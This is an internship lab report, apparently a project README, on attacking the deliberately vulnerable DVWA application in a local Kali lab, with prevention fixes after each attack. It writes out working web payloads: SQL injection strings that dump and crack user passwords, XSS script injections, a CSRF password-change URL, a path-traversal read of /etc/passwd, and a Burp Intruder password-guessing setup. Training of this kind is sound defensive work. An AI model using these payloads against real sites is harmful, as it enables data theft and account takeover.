# 🌐 Task 3 — Web Application Security
## ApexPlanet Software Pvt. Ltd. Internship

**Intern:** Amir Mustak Shaikh  
**Duration:** Days 25–36  
**Lab OS:** Kali Linux (VM)  
**Target:** DVWA (Damn Vulnerable Web Application)  
**Objective:** Identify and exploit OWASP Top 10 vulnerabilities in a controlled lab environment.

---

## 1️⃣ SQL Injection

### What is SQL Injection?
SQL Injection is a web security vulnerability that allows attackers to interfere with database queries by injecting malicious SQL code into input fields.

### Attack Demonstration

**Step 1 — Normal Input:**
```
Input: 1
Result: ID: 1, First name: admin, Surname: admin
```

**Step 2 — OR Attack (Extract all users):**
```sql
Input: 1' OR '1'='1
Result: All 5 users extracted!
- admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith
```

**Step 3 — UNION Attack (Extract passwords):**
```sql
Input: 1' UNION SELECT user, password FROM users#
Result: All MD5 hashed passwords extracted!
```

| Username | MD5 Hash | Cracked Password |
|----------|---------|-----------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

### Prevention — Prepared Statements
```php
// Vulnerable code
$query = "SELECT * FROM users WHERE id = '$id'";

// Secure code — Prepared Statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

**Other Prevention:**
- Input validation & sanitization
- WAF (Web Application Firewall)
- Principle of least privilege on DB accounts

---

## 2️⃣ Cross-Site Scripting (XSS)

### What is XSS?
XSS allows attackers to inject malicious scripts into web pages viewed by other users.

### Reflected XSS Attack
```
URL: http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script>alert('XSS by Amir')</script>
Result: Alert popup — "XSS by Amir" ✅
```

### Stored XSS Attack
```
Name field: <script>alert('Stored XSS')</script>
Message: Stored XSS Test
Result: Script stored in DB — executes every time page loads!
```

### Prevention
```php
// Input Validation
$name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');

// Content Security Policy (CSP) Header
Header: Content-Security-Policy: default-src 'self'
```

---

## 3️⃣ Cross-Site Request Forgery (CSRF)

### What is CSRF?
CSRF tricks authenticated users into unknowingly submitting malicious requests.

### Attack Demonstration
```
# Normal password change requires form submission
# CSRF Attack — change password via URL:
http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change

Result: Password Changed! — without user's knowledge ✅
```

### Prevention
```php
// Token-based Protection
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;

// Verify token on form submission
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token mismatch!');
}
```

---

## 4️⃣ File Inclusion Attacks

### Local File Inclusion (LFI)
```
URL: http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../etc/passwd
Result: Sensitive system file exposed!
```

### Prevention
```php
// Whitelist allowed files
$allowed = ['about.php', 'contact.php'];
if (!in_array($page, $allowed)) {
    die('File not allowed!');
}
```

---

## 5️⃣ Burp Suite Advanced

### Intercepting Login Request
- Burp Suite Community Edition v2026.7.2
- Proxy → Intercept ON
- Captured GET and POST requests to DVWA login

**POST Request captured:**
```
POST /DVWA/login.php HTTP/1.1
Host: 127.0.0.1
username=admin&password=password&Login=Login&user_token=xxx
```

### Intruder — Password Fuzzing
- Sent POST request to Intruder
- Set payload position on `§password§`
- Payload list: password, admin, 123456, hacked123
- Attack type: Sniper
- Result: Different response length = correct password identified

---

## 6️⃣ Web Security Headers

### Security Scan Results (securityheaders.com)
- Target: https://example.com
- **Grade: F** — Missing critical security headers

**Missing Headers found:**
- ❌ Strict-Transport-Security
- ❌ Content-Security-Policy
- ❌ X-Frame-Options
- ❌ X-Content-Type-Options
- ❌ Referrer-Policy
- ❌ Permissions-Policy

### Fix — Apache Security Headers Configuration
```bash
sudo nano /etc/apache2/conf-available/security-headers.conf
```

```apache
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-XSS-Protection "1; mode=block"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Content-Security-Policy "default-src 'self'"
```

```bash
sudo a2enmod headers
sudo a2enconf security-headers
sudo service apache2 restart
```

**Result:** Module headers enabled ✅ | Conf security-headers enabled ✅

---

## 📊 OWASP Top 10 Coverage

| OWASP Category | Vulnerability Tested | Status |
|---------------|---------------------|--------|
| A03 — Injection | SQL Injection | ✅ Exploited + Fixed |
| A07 — XSS | Reflected + Stored XSS | ✅ Exploited + Fixed |
| A01 — Broken Access Control | CSRF Attack | ✅ Exploited + Fixed |
| A05 — Security Misconfiguration | File Inclusion, Missing Headers | ✅ Identified + Fixed |
| A02 — Cryptographic Failures | MD5 Password Hashing | ✅ Analyzed |

---

## 📸 Screenshots
All screenshots in `/screenshots/` folder:

| File | Description |
|------|-------------|
| 01-sql-injection-normal.jpeg | Normal SQL query result |
| 02-sql-injection-or-attack.jpeg | OR attack — all users extracted |
| 03-sql-injection-passwords.jpeg | UNION attack — passwords extracted |
| 04-xss-reflected-alert-dark.jpeg | Reflected XSS alert popup |
| 05-xss-reflected-page.jpeg | XSS reflected page |
| 06-xss-reflected-alert.jpeg | XSS alert with DVWA |
| 07-xss-stored-guestbook.jpeg | Stored XSS guestbook entries |
| 08-csrf-url-attack.jpeg | CSRF URL attack |
| 09-csrf-form.jpeg | CSRF form password change |
| 10-file-inclusion-lfi.jpeg | LFI attack |
| 11-burp-get-request.jpeg | Burp Suite GET intercept |
| 12-burp-post-request.jpeg | Burp Suite POST intercept |
| 13-burp-intruder-payload.jpeg | Intruder payload setup |
| 14-burp-intruder-attack.jpeg | Intruder attack running |
| 15-security-headers-site.jpeg | Security headers scan site |
| 16-security-headers-scan-result.png | Grade F scan result |
| 17-security-headers-apache.png | Apache headers configured |

---

## ✅ Task 3 Completion Summary
- [x] SQL Injection — credentials extracted, prevention demonstrated
- [x] Reflected XSS — alert popup via URL parameter
- [x] Stored XSS — persistent script in guestbook
- [x] CSRF — password changed via malicious URL
- [x] File Inclusion (LFI) — sensitive file access attempted
- [x] Burp Suite — GET/POST intercept + Intruder fuzzing
- [x] Web Security Headers — F grade scan + Apache headers added

---

*ApexPlanet Software Pvt. Ltd. Cybersecurity Internship — Task 3*
